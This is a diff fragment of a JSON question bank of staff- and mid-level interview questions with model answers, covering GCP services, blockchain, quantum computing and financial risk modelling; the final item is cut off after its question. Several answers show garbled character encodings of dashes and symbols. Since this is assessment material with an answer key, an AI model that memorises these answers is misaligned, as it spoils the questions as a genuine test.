+      "a": "Not necessarily -- ADK is explicitly model-agnostic and deployment-agnostic so teams aren't forced into all-or-nothing migration. A team with working, battle-tested LangChain tool integrations can keep those components and adopt ADK/Agent Engine specifically for pieces that add clear value (managed session/memory persistence, GCP-native scaling) rather than rewriting working code for its own sake. The tradeoff to name explicitly: a mixed stack won't get Agent Engine's full managed-scaling/observability story for the non-ADK components -- that's a real cost, not something to gloss over, and the decision should weigh migration cost against incremental benefit per component, not assume a full rewrite is automatically justified because a new platform launched.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-GCP-ai-d12",
+      "module": "C-GCP-ai",
+      "q": "Explain why picking an agent platform based purely on model-quality benchmarks is an incomplete evaluation.",
+      "a": "All three major clouds now carry near-frontier models from multiple vendors via their catalogs (Model Garden covers Gemini/Claude/Llama/Mistral; Bedrock covers Claude/Titan/Llama/Mistral/Cohere/DeepSeek; Foundry covers OpenAI plus a broader catalog) -- model quality is decreasingly a differentiator since the same top models are often available on more than one platform. The actual differentiator is the surrounding runtime/memory/identity/tool-access architecture and fit with the org's existing cloud footprint -- e.g. Foundry's measurable M365 integration advantage for Microsoft-centric orgs has nothing to do with any model's benchmark score.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "C-GCP-data-d11",
+      "module": "C-GCP-data",
+      "q": "Compare Redshift Serverless's billing unit to BigQuery on-demand's, and explain why calling both 'serverless' is misleading in a cost-modeling discussion.",
+      "a": "Redshift Serverless bills RPU-hours consumed while active ($0.375/RPU-hour, 60-second minimum, 16GB memory per RPU) -- still a capacity-shaped billing unit (capacity x time), conceptually closer to BigQuery Editions than to BigQuery on-demand. BigQuery on-demand bills purely on bytes scanned with zero idle charge and no capacity unit to reason about at all. For extremely spiky, low-volume workloads, BigQuery on-demand's cost curve is flatter and lower since it has no per-active-period minimum the way Redshift Serverless's 60-second floor does -- 'serverless' describes the absence of a cluster to manage in both cases, but the underlying billing mechanics differ meaningfully.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-GCP-data-d12",
+      "module": "C-GCP-data",
+      "q": "Walk through the three layered BigQuery cost controls and explain why none of them alone is sufficient.",
+      "a": "maximum_bytes_billed is a per-query, pre-execution estimate-based safety net -- catches one runaway query but does nothing against many individually-small queries adding up, and can miss cases where actual execution scans more than the pre-execution estimate predicted. Custom quotas cap total daily bytes scanned at project or user level (200 TiB default since 2025-09-01) -- catches the aggregate-many-small-queries case maximum_bytes_billed misses, but are approximate safeguards, not strict byte-by-byte caps, and reset only at midnight PT. Partitioning/clustering attacks the root cause (bytes scanned per query) rather than capping after the fact -- without it, both other controls just constrain an inherently wasteful baseline. All three stacked is the actual production answer.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "C-GCP-iam-d11",
+      "module": "C-GCP-iam",
+      "q": "A workload identity pool provider's attribute condition was loosened during a migration and nobody noticed for three weeks. What's the blast radius and how do you detect this class of incident?",
+      "a": "Blast radius is every external caller the IdP itself considers valid for that provider -- e.g. any repo in the entire GitHub org, not just the intended one -- able to impersonate whichever service account the pool's bindings allow, for the whole exposure window. Detect via Cloud Audit Logs alerts on pool/provider config changes, plus runtime monitoring of STS token-exchange logs for unexpected source attribute values (e.g. a spike in distinct repository claims against a pool meant to serve one repo).",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-GCP-networking-d11",
+      "module": "C-GCP-networking",
+      "q": "Why does global-VPC reachability not mean zero added latency between regions, and how would you diagnose unexpectedly high cross-region latency inside one VPC?",
+      "a": "Global VPC removes the CONFIGURATION burden of cross-region reachability (no peering/transit needed), but physical distance and Google's backbone routing path still impose real latency -- 'global' describes the resource's scope, not a physics exemption. To diagnose unexpected latency: check whether the actual traffic path is going through an internal load balancer scoped to the wrong region, a route misconfiguration forcing a suboptimal path, or backend selection issues -- not assume the VPC-global property itself is broken, since it only guarantees reachability, not any particular latency bound.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "C-GCP-networking-d12",
+      "module": "C-GCP-networking",
+      "q": "Explain when a regional load balancer is the correct choice over the global external Application Load Balancer, even for an internet-facing production service.",
+      "a": "Data-residency requirements mandating traffic stay within a specific jurisdiction's routing path; active-passive DR designs needing explicit manual/scripted control over which region serves traffic rather than automatic nearest-PoP routing; genuinely single-region user bases where global anycast's cost premium and Premium Tier networking requirement buy nothing; or a deliberate choice of Standard Tier (cheaper, internet-routed) networking over Premium Tier backbone routing. Cloud Armor still attaches to regional LBs, but the edge-absorption DDoS benefit tied to global anycast's PoP distribution is lost.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "C-GCP-ops-d11",
+      "module": "C-GCP-ops",
+      "q": "A service's SLO burn-rate alert correctly fires, but the root cause is a dependency's outage entirely outside the team's control. Was the alerting wrong, and should the dependency's failures be excluded from the SLI going forward?",
+      "a": "The alerting was not wrong -- burn-rate alerts are deliberately cause-agnostic, measuring user-observed budget consumption regardless of root cause; a downstream dependency degrading this service's SLI is still real user impact and correctly surfaced. The default answer to excluding it is no: doing so risks the SLO no longer reflecting actual user experience, defeating its purpose. If the dependency's failures are common enough to meaningfully distort the SLO, the better fix is improving resilience (retries, fallbacks, circuit breakers) or renegotiating the SLO target with that dependency's reliability factored in -- not quietly excluding inconvenient data from the measurement.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-GCP-ops-d12",
+      "module": "C-GCP-ops",
+      "q": "Why is Cloud Trace's sampling strategy decision rarely driven by its direct billing cost, and what actually drives it?",
+      "a": "At 2.5M free spans/month and $0.20/million beyond, Cloud Trace's direct cost is negligible relative to compute or Logging spend for most workloads -- optimizing sampling purely to minimize that line item targets the wrong number. The real drivers are downstream trace storage/query cost and latency at high retained volume, signal-to-noise for engineers investigating incidents (too much routine data buries the interesting traces), and the need to preferentially retain error/slow-outlier traces over routine successful ones -- which is a signal-quality problem tail-based sampling addresses directly and head-based sampling only addresses probabilistically.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "C-GCP-storage-db-d11",
+      "module": "C-GCP-storage-db",
+      "q": "Why is NTP-synchronized clock uncertainty insufficient to replicate Spanner's guarantees outside Google's infrastructure?",
+      "a": "NTP-only synchronization typically leaves clock uncertainty in the tens-to-hundreds of milliseconds range, versus TrueTime's under-7ms bound from GPS receivers and atomic clocks cross-checked in every datacenter. Commit-wait's cost scales directly with the uncertainty bound being waited out -- at NTP-scale uncertainty, commit-wait would either add unacceptable per-transaction latency or force accepting a materially weaker consistency guarantee than Spanner's. This is why TrueTime-grade external consistency is a genuine infrastructure moat, not just a software technique anyone can replicate by copying the commit-wait algorithm.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "C-GCP-storage-db-d12",
+      "module": "C-GCP-storage-db",
+      "q": "Explain why Bigtable and BigQuery are often used together for the same clickstream dataset rather than picking one.",
+      "a": "Bigtable serves the ingestion/serving path: extremely high write throughput, low-latency single-key lookups (e.g. a user's last N events by user_id), no ad-hoc analytical query need. BigQuery serves the analysis path: ad-hoc SQL aggregation, joins, scan-based billing suited to occasional large queries rather than constant point lookups. Bigtable has no SQL engine or secondary indexes, so analytical queries beyond a row-key range scan require either a slow client-side full scan or BigQuery's external Bigtable connector -- worse than querying data already loaded natively into BigQuery. A pipeline (Dataflow) continuously loads the same stream into both, accepting the duplication as the right tradeoff.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T22-blockchain-scratch-d11",
+      "module": "T22-blockchain-scratch",
+      "q": "Design a test suite for a from-scratch blockchain implementation. What cases actually matter?",
+      "a": "Positive: valid N-block chain validates true. Negative: mutating any historical field without recomputing must be caught; a block failing the PoW target must be rejected even if internally consistent; broken index/previous_hash sequencing must be rejected. Fork-specific: equal block count but different cumulative work must resolve to the heavier chain, never the merely-longer one.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-blockchain-scratch-d12",
+      "module": "T22-blockchain-scratch",
+      "q": "What's the easiest way to subtly get block validation wrong when implementing proof-of-work checking?",
+      "a": "Conflating mining (searching for a valid nonce) with validation (checking a claimed nonce is valid) -- re-running the PoW search during validation instead of simply re-hashing once and comparing against the target. This defeats the entire cheap-verification property the mining/verification asymmetry depends on.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-consensus-d12",
+      "module": "T22-consensus",
+      "q": "If a deposit is denominated in a smaller-cap PoW altcoin instead of Bitcoin, should you use Bitcoin's confirmation policy?",
+      "a": "No. Smaller-cap chains have dramatically less total hashrate, so the same nominal 'q=0.3 attacker' is achievable at far lower absolute cost -- real, documented 51% attacks against smaller chains have used rented hashpower from public marketplaces. Confirmation policy must be set per-chain based on its actual current hashrate and rentable-hashpower cost.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-contract-security-d12",
+      "module": "T22-contract-security",
+      "q": "Compare integer overflow, reentrancy, and oracle manipulation by root-cause layer: which is language-level, code-pattern-level, and architecture-level?",
+      "a": "Integer overflow: language/compiler-level -- Solidity 0.8's checked-arithmetic default fixed the common case. Reentrancy: code-pattern-level -- the language provides everything needed to write it safely; the fix is developer discipline (CEI) plus tooling (ReentrancyGuard). Oracle manipulation: architecture-level -- no code pattern or compiler default fixes a design decision to trust a manipulable price source; only a different architectural choice (TWAP, decentralized oracle) fixes it.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-crypto-primitives-d11",
+      "module": "T22-crypto-primitives",
+      "q": "A junior engineer proposes storing private keys as environment variables and signing directly in application code 'since we control the servers.' What's your response?",
+      "a": "The primitives can be sound while key custody is the actual failure point -- an env-var key is readable by anything with process access, has no audit trail, and if leaked compromises every past and future signature permanently with no rotation equivalent. Use a signing service or HSM that performs signing internally and never exports the private key; the app only ever receives (r, s).",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-crypto-primitives-d12",
+      "module": "T22-crypto-primitives",
+      "q": "Does using an HSM fully eliminate ECDSA nonce-reuse risk?",
+      "a": "No. An HSM protects key material from exfiltration, but if its internal nonce generation is buggy or non-RFC-6979-compliant, nonce reuse is still possible in principle. Verify via vendor documentation or independent audit that the HSM's ECDSA implementation uses deterministic or properly-audited random nonce generation -- don't assume 'hardware' implies immunity to this specific algebraic attack.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-enterprise-blockchain-d10",
+      "module": "T22-enterprise-blockchain",
+      "q": "How would you evaluate whether a specific CBDC proposal is a genuine distributed-ledger design or 'blockchain' used as branding on an otherwise-centralized system?",
+      "a": "Ask whether a single operator (the central bank) unilaterally controls issuance, settlement finality, and reversal/freeze ability. If so -- true of most actual CBDC designs, since central banks don't typically propose giving up unilateral monetary control -- the system lacks the distributed-trust property that would justify calling it meaningfully different from a conventional centralized digital payment system, regardless of internal use of blockchain-derived data structures.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-enterprise-blockchain-d11",
+      "module": "T22-enterprise-blockchain",
+      "q": "If a CBDC doesn't remove central bank control, is using blockchain-derived data structures (hash chains, Merkle trees) for it pointless?",
+      "a": "Not pointless -- these techniques can provide real engineering benefits (tamper-evidence, auditability, resilience against single-node corruption) independent of achieving blockchain's full distributed-trust property. The mistake is marketing such a system as 'blockchain-based' in a way that implies distributed-trust properties the actual governance design doesn't deliver.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-enterprise-blockchain-d12",
+      "module": "T22-enterprise-blockchain",
+      "q": "Could a public-chain approach have saved TradeLens's actual use case -- shipping documentation?",
+      "a": "Potentially reframed, worth considering: building smart contracts on a public chain rather than a Maersk/IBM-operated consortium would have structurally changed the 'who controls the infrastructure' objection (no single competitor controls a public chain). But other real barriers -- data privacy for commercially sensitive details on a fully transparent ledger, regulatory questions, adoption incentives -- would still need solving. This is genuinely uncertain counterfactual territory, not a confident conclusion.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-smart-contracts-d11",
+      "module": "T22-smart-contracts",
+      "q": "What if a delegatecall target is only knowable at runtime, e.g., a beacon proxy pattern where the implementation address is fetched from another contract -- does that change the audit surface?",
+      "a": "The audit surface explicitly includes the beacon contract's own access control (who can change what it points to) as part of the same trust boundary. A beacon whose update function has weak access control is exactly as exploitable as a hardcoded delegatecall to an unaudited contract, just with an extra layer of indirection obscuring it.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T22-smart-contracts-d12",
+      "module": "T22-smart-contracts",
+      "q": "Why is 'smart contracts are immutable' not universally true in production, and when should a team deliberately choose NOT to make a contract upgradeable?",
+      "a": "Upgradeable proxies are the mainstream production pattern for most significant DeFi protocols, but immutability is a real, valuable security property -- users and auditors can verify exactly what code they're trusting, permanently. Well-audited protocols deliberately ship without upgrade mechanisms specifically to make that guarantee credible; upgradeability should be a deliberate tradeoff, not a reflexive default.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-algorithms-d11",
+      "module": "T23-algorithms",
+      "q": "Is 'no known efficient quantum algorithm against lattice problems' the same guarantee as 'provably secure against quantum computers'?",
+      "a": "No \u00e2\u20ac\u201d it's an absence of a known attack, not a proof of security, the same epistemic status classical cryptography has always had (RSA was never proven hard either). Confidence comes from years of failed cryptanalysis, not a mathematical impossibility proof.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-algorithms-d12",
+      "module": "T23-algorithms",
+      "q": "A team proposes using Grover's algorithm to speed up nearest-neighbor search over a 10-million-item embedding index. Evaluate this proposal.",
+      "a": "Nearest-neighbor search isn't truly unstructured \u00e2\u20ac\u201d classical ANN methods (HNSW) already exploit geometric structure to beat literal linear scan, likely outperforming Grover's \u00e2\u02c6\u0161N against a genuinely unstructured comparison. Even granting the framing, \u00e2\u02c6\u0161(10M)\u00e2\u2030\u02c63,162 only beats linear scan, not the actual classical ANN baseline it would need to displace, and no current hardware sustains a coherent 10M-item quantum search circuit anyway.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-error-correction-d11",
+      "module": "T23-error-correction",
+      "q": "A team wants to plan a 5-year roadmap assuming fault-tolerant computers capable of breaking RSA-2048 will exist by year 3, citing 2026's below-threshold demonstration. Evaluate this assumption.",
+      "a": "The premise is accurate but the inference isn't supported \u00e2\u20ac\u201d 2026's demonstrations involve small logical qubit counts (12) for short computations, while RSA-2048 needs an estimated hundreds of thousands to ~1M physical qubits sustained through a deep circuit, several more orders of magnitude beyond what's shown. Treat 'year 3' as one scenario among a wide expert range (roughly 5-30 years), not a committed timeline.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-error-correction-d12",
+      "module": "T23-error-correction",
+      "q": "Given hardware timeline uncertainty, should post-quantum cryptography migration planning wait for more clarity?",
+      "a": "No \u00e2\u20ac\u201d migration timelines are driven by data sensitivity duration and how long real migrations take (often years), not by pinning the exact year a quantum computer arrives. The harvest-now-decrypt-later threat model means data encrypted today with vulnerable algorithms is already at risk regardless of when decryption capability arrives.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-gates-circuits-d11",
+      "module": "T23-gates-circuits",
+      "q": "Does no-cloning mean quantum error correction is impossible, since classical error correction relies on redundant copies?",
+      "a": "No \u00e2\u20ac\u201d error correction entangles the logical state across physical qubits (e.g. a|000\u00e2\u0178\u00a9+b|111\u00e2\u0178\u00a9 built via CNOTs) rather than producing independent copies of an unknown superposition. No step ever clones the state, so no-cloning is never violated.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-gates-circuits-d12",
+      "module": "T23-gates-circuits",
+      "q": "Does Toffoli alone (without H) give universal quantum computation?",
+      "a": "No \u00e2\u20ac\u201d Toffoli plus H is universal, but Toffoli alone only gives universal classical reversible computation since it never creates superposition. Full quantum universality outside the classically-simulable Clifford+Toffoli regime also typically requires T.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-post-quantum-d11",
+      "module": "T23-post-quantum",
+      "q": "A startup engineering lead proposes deploying ML-KEM-only (no hybrid) for a new product's TLS, arguing the overhead of hybrid isn't worth it since ML-KEM is already NIST-standardized. Evaluate this.",
+      "a": "Recommend against PQC-only even for a new product: NIST standardization isn't equivalent to decades of real-world adversarial scrutiny RSA/ECC have had, and NSA's own CNSA 2.0 guidance recommends hybrid through 2030 for this reason. The overhead (larger handshakes, middlebox risk) is modest relative to the downside of an unhedged dependency on a newer, less-scrutinized algorithm.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-post-quantum-d12",
+      "module": "T23-post-quantum",
+      "q": "How should leadership pushback that post-quantum migration is 'premature given hardware timeline uncertainty' be addressed?",
+      "a": "Separate the two questions: hardware timeline uncertainty (genuinely wide, 5-30 years per expert estimates) affects messaging urgency, but not the recommended action \u00e2\u20ac\u201d the migration itself takes years regardless of exactly when the threat materializes, so waiting for certainty guarantees starting later than optimal under any actual timeline. This is a decision-under-uncertainty argument, not a specific-date prediction.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-qiskit-d11",
+      "module": "T23-qiskit",
+      "q": "What failed when trying to pip install qiskit in a network-isolated sandbox, and why disclose that in a hands-on module rather than hide it?",
+      "a": "The install failed with a proxy/network connectivity error. Disclosing it and using a genuinely-run, cross-checked numpy statevector simulator instead of silently presenting untested Qiskit code as verified is the honest practice \u00e2\u20ac\u201d labeling unrun code '# untested sketch' preserves trust in what actually was verified.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-qiskit-d12",
+      "module": "T23-qiskit",
+      "q": "A circuit works on a noiseless local simulator but transpiling it for real hardware inflates the gate count dramatically. What's the likely cause and fix?",
+      "a": "The real backend's coupling map doesn't support required two-qubit gates directly between the chosen qubits, forcing the router to insert SWAP gates (each ~3 CNOTs). Fix by checking backend.coupling_map before submission and choosing a logical-to-physical layout that keeps interacting qubits adjacent.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-quantum-ml-d11",
+      "module": "T23-quantum-ml",
+      "q": "Your team is deciding whether to invest engineering time in a QML pilot for a real business problem in 2026. What's your recommendation?",
+      "a": "Recommend against committing significant resources to running the task on quantum hardware today \u00e2\u20ac\u201d no reproducible advantage exists at relevant scale, and barren plateaus plus shot-count scaling make near-term scaling unlikely. Better use of limited investment: a small team monitoring the literature for claims surviving dequantization scrutiny, while primary effort stays on the best classical methods.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-quantum-ml-d12",
+      "module": "T23-quantum-ml",
+      "q": "If VQE always gives an upper bound on ground energy, does that mean more optimization steps always monotonically improve the estimate?",
+      "a": "Not necessarily \u00e2\u20ac\u201d the guarantee is about the theoretical minimum over the ansatz family, not the optimizer's trajectory. A non-convex landscape, especially with barren plateaus, can cause stalling or getting stuck in a local minimum well above the true ground energy despite more steps being run.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-qubits-d11",
+      "module": "T23-qubits",
+      "q": "What is the Schmidt rank of a two-qubit state, and how does it generalize the determinant test for entanglement?",
+      "a": "Reshape the state's coefficients into a matrix and take its SVD; Schmidt rank is the number of nonzero singular values. Rank 1 means separable (matching det(C)=0/rank(C)=1 for the 2x2 case); rank >1 means entangled, with the value quantifying how much. For 3+ qubits there is no single such scalar \u00e2\u20ac\u201d e.g. GHZ and W states are both entangled but inequivalent under local operations.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T23-qubits-d12",
+      "module": "T23-qubits",
+      "q": "A recruiter-facing summary claims a quantum computer 'processes information exponentially faster because qubits explore all possibilities in parallel.' Give the precise one-sentence correction.",
+      "a": "Qubits don't freely 'explore in parallel' in a readable way \u00e2\u20ac\u201d the exponential state space enables interference between computational paths during unitary evolution, and only specific algorithms with problem structure amenable to interference (Grover: quadratic, Shor: superpolynomial for period-finding) turn that into a proven, bounded, problem-specific speedup \u00e2\u20ac\u201d never a generic exponential one.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-ai-in-finance-d9",
+      "module": "T24-ai-in-finance",
+      "q": "A lender wants to use alternative data (utility/rent payments, cash-flow history) to extend credit to thin-file applicants. What fair-lending risk does this introduce, and does improving aggregate access resolve it?",
+      "a": "Alternative data sources can correlate with protected-class membership through geography, employment type, or banking-access patterns -- the same proxy-discrimination risk as traditional features. Improving aggregate access does not automatically resolve fair-lending risk: a model can improve access overall while still showing disparate impact on specific decision margins (who's approved vs still denied) or pricing/terms -- requires outcome-level disparate-impact testing across the full decision, not just the headline approval-rate.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-ai-in-finance-d10",
+      "module": "T24-ai-in-finance",
+      "q": "Design question: your CEO wants to ship a more accurate but genuinely less-explainable deep learning underwriting model over an interpretable alternative. How do you handle it, and how does this shape your architecture choices from the start?",
+      "a": "Treat the adverse-action-reason-code requirement as a hard architectural constraint decided at model-selection time, not a bolt-on: use an interpretable-by-design model, or if a more complex model is justified by material accuracy gain, build and validate a stability-tested explanation pipeline BEFORE it generates real adverse decisions. Quantify the accuracy gain (reduced default losses) against the specific legal exposure (CFPB Circular 2026-03: complexity doesn't excuse compliance) -- invest in the explanation infrastructure up front rather than shipping first and fixing explainability later, since remediating live legally-deficient adverse-action notices (including liability for past decisions) is far more expensive.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-basel-d9",
+      "module": "T24-basel",
+      "q": "A quarter-end RWA figure doesn't reconcile against finance's general ledger, requiring manual adjustment entries. What's the likely root cause and fix?",
+      "a": "Likely cause: the risk-data-aggregation pipeline uses a different position snapshot time, netting logic, or currency-conversion path than the general ledger -- a classic BCBS 239 gap. Fix: establish a single golden-source data lineage feeding both finance and risk pipelines identically, with automated daily (not quarter-end-only) reconciliation controls.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-basel-d10",
+      "module": "T24-basel",
+      "q": "Design question: you're the Principal engineer for a regional bank that just crossed $100B in assets and picked up LCR/NSFR obligations for the first time. What's your first-quarter plan, and how do you handle a board deadline that arrives before the proper build is done?",
+      "a": "Start with data lineage and product-taxonomy mapping (classifying every deposit/loan/security into regulatory categories), not the ratio arithmetic -- that classification work is the real bottleneck. Build the mapping layer as versioned, testable, auditable code decoupled from the aggregation math. Stand up automated daily reconciliation against treasury/finance cash-flow systems immediately. If the board wants numbers in six weeks, deliver a clearly-labeled interim manual/semi-automated calculation with documented conservative assumptions and explicit gaps, continuing the proper automated build in parallel -- a precise-looking number on unreconciled data is worse than a clearly-caveated interim estimate.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-derivatives-d10",
+      "module": "T24-derivatives",
+      "q": "Design question: building a Monte Carlo pricer for a barrier option (knocks out if the underlying touches a level before expiry), what implementation risks go beyond standard vanilla Monte Carlo?",
+      "a": "Discrete-time simulation only checks the barrier at simulated steps, underestimating true knock-out probability for a continuously-monitored barrier (needs a Brownian-bridge correction or fine discretization with explicit convergence checks). Variance is much higher near the barrier (payoff highly sensitive to barrier touch), often needing importance sampling or a targeted control variate. Finite-difference Greeks near the barrier are numerically unstable due to payoff discontinuity and typically need a smoothed estimator.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-market-microstructure-d10",
+      "module": "T24-market-microstructure",
+      "q": "Design question: building a smart order router across 12 lit exchanges and 6 dark pools, what are the highest-priority modeling decisions in order, and how would you validate venue-toxicity scoring?",
+      "a": "Priority: (1) venue scoring via realized-vs-effective spread per venue to detect toxic/adverse-selection-heavy flow, (2) configurable risk-aversion (kappa) per order matching actual urgency, (3) real-time recalibration of impact/volatility parameters to avoid stale-calibration failure during regime shifts, (4) routing/tie-break mechanics last. Validate toxicity scores the same way as any predictive model: walk-forward, leakage-free backtesting -- track realized spread per venue out of sample and confirm 'less toxic' venues actually show smaller price-impact components after the fact, not just at the time scores were computed.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-mrm-d9",
+      "module": "T24-mrm",
+      "q": "What happened before SR 11-7, and what specific 2008-crisis failure directly motivated it?",
+      "a": "Before 2011, model risk was handled ad hoc within individual business lines with no unified firm-wide standard or mandated independent validation function. The 2008 crisis exposed this: deeply flawed mortgage-related valuation/rating models (MBS/CDO pricing and the ratings built on them) had no independent, empowered effective-challenge process forcing critical review before driving trillions of dollars of exposure. SR 11-7 (April 4, 2011) was the Fed/OCC's direct response.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-mrm-d10",
+      "module": "T24-mrm",
+      "q": "Design question: you're asked to build MRM-equivalent governance for a new agentic AI system that can autonomously initiate wire transfers, even though SR 26-2 formally excludes agentic AI from scope. What do you build, and how do you argue for the investment if leadership says it isn't legally required?",
+      "a": "Build proportional to actual business risk: inventory entry with exposure tracking (authority limit x transaction frequency), independent red-teaming for prompt-injection/unauthorized-action/guardrail-bypass, ongoing drift/anomaly monitoring, and a real effective-challenge mechanism with authority to pause the system. Argue on prudential/reputational-risk grounds independent of the regulatory carve-out -- reframe from 'compliance' to 'operational risk control for an autonomous system with financial authority,' the same segregation-of-duties and audit controls already required for a human employee with wire-transfer authority apply with equal force to a non-human agent with the same authority.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-portfolio-d10",
+      "module": "T24-portfolio",
+      "q": "Design question: building a fully systematic robo-advisor portfolio module across 15 asset classes with no explicit human return forecasts, would you use mean-variance optimization, risk parity, or a hybrid? What would change your answer if a tactical view was later added?",
+      "a": "Prefer risk parity (or minimum-variance with constraints) as the systematic default -- with no return forecasts, mean-variance would either fabricate noisy historical-mean estimates (walking into the estimation-error-maximization problem) or degenerate into risk parity anyway. If a tactical view is later added (e.g. 'emerging markets will outperform'), Black-Litterman is the right upgrade: it layers the specific view onto a market-equilibrium-implied prior with explicit confidence weighting, avoiding both ignoring the view (risk parity can't use it) and naive mean-variance's instability from overweighting an unshrunk view.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-risk-metrics-d9",
+      "module": "T24-risk-metrics",
+      "q": "A market-risk model passes backtesting cleanly for three years, then loses 8x its stated 99% VaR in a single crisis day. Was the model wrong?",
+      "a": "Not necessarily in a calibration sense -- a correctly calibrated 99% VaR model is expected to be exceeded ~1% of the time, and a large breach during a genuine unprecedented regime shift is consistent with correct calibration for the 'normal' regime it was built on while being structurally blind to a regime it never sampled. This is exactly why stress testing and reverse stress testing must be run as mandatory complements to VaR/ES, not replacements.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-risk-metrics-d10",
+      "module": "T24-risk-metrics",
+      "q": "Design question: building the nightly automated backtesting pipeline for nine trading desks, what would you compute and alert on beyond a single per-desk Kupiec pass/fail?",
+      "a": "Track both hypothetical (clean) and actual (dirty) P&L against prior VaR (FRTB requires both, and divergence between them is itself diagnostic of intraday risk-taking). Run Christoffersen's independence test and the combined conditional-coverage statistic alongside Kupiec to catch clustering. Alert proactively at 3 exceptions rather than waiting for the yellow-zone threshold at 5. Cross-check parametric/historical/Monte Carlo VaR against each other daily, alerting on divergence relative to each book's own trailing baseline spread (not a fixed threshold, since normal disagreement varies by asset class). Reconcile front-office vs independent risk VaR numbers daily as a standing control.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-time-series-core-d10",
+      "module": "T24-time-series-core",
+      "q": "When would you deliberately choose BIC over AIC for ARIMA order selection, and what's the tradeoff?",
+      "a": "When the goal is a parsimonious, interpretable model of the underlying process (e.g., explaining structure to a risk committee) rather than pure forecast accuracy -- BIC's k*ln(n) penalty is heavier at large n and more likely to recover the true sparse model. Tradeoff: AIC is asymptotically better for one-step-ahead prediction accuracy, so a BIC-selected model can underfit slightly relative to what minimizes forecast error.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-time-series-core-d11",
+      "module": "T24-time-series-core",
+      "q": "Why do you need to check whether a seasonal series' seasonal pattern is itself drifting before choosing classical decomposition vs STL?",
+      "a": "Classical decomposition estimates one fixed seasonal profile applied identically to every cycle across the whole series; if the seasonal shape genuinely evolves (e.g., a holiday peak shifting a week earlier over several years), classical decomposition blurs that real evolving structure into the noise/remainder term. STL's Loess-based approach lets the seasonal component adapt over time and captures it correctly.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-time-series-modern-d10",
+      "module": "T24-time-series-modern",
+      "q": "What's the practical risk of using a foundation model like TimesFM zero-shot on a financial return series, and how would you test it before trusting it?",
+      "a": "Foundation models are pretrained mostly on series with visible trend/seasonality (retail, web traffic); financial returns are closer to a low-signal, fat-tailed near-random-walk, so zero-shot uncertainty estimates may be miscalibrated. Test via walk-forward backtesting and check empirical coverage of quantile forecasts (does the 90% interval actually contain ~90% of realized values out of sample) before trusting it in production.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T24-time-series-modern-d11",
+      "module": "T24-time-series-modern",
+      "q": "Distinguish Prophet's changepoint trend from a Kalman local-level-plus-trend model -- aren't both just 'trend that can change'?",
+      "a": "Prophet's trend is piecewise linear with a small, regularized set of discrete changepoints -- a structural, sparse-jump story. A Kalman trend evolves continuously every period via process noise Q, a smooth random walk with no discrete changepoints. They can look similar smoothed but extrapolate differently: Prophet tends to extend the last growth rate more conservatively; a Kalman model with nontrivial Q keeps accumulating uncertainty every step into the future.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T24-ts-validation-d10",
+      "module": "T24-ts-validation",
+      "q": "Why does a good Deflated Sharpe Ratio not by itself mean a strategy is production-ready?",
+      "a": "DSR addresses statistical significance of the backtested Sharpe under multiple testing; it says nothing about transaction costs, market impact, capacity constraints, or regime shift after deployment -- those require separate diagnostics (market microstructure, risk metrics) even after a strategy clears the leakage and multiple-testing bars.",
+      "difficulty": "mid"
+    },
+    {
+      "id": "T26-frontier-landscape-d13",
+      "module": "T26-frontier-landscape",
+      "q": "In the Gemini 3.1 Pro '13 of 16 wins' launch (Feb 2026), what was omitted from the headline comparison table despite being in the underlying model card data?",
+      "a": "GDPval-AA enterprise-task Elo, where Claude models led by roughly 300 points -- present in the underlying data but absent from the headline comparison.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T26-frontier-landscape-d14",
+      "module": "T26-frontier-landscape",
+      "q": "Why can a benchmark ranking flip entirely between 'with tools' and 'without tools' conditions on the same benchmark (e.g. Humanity's Last Exam)?",
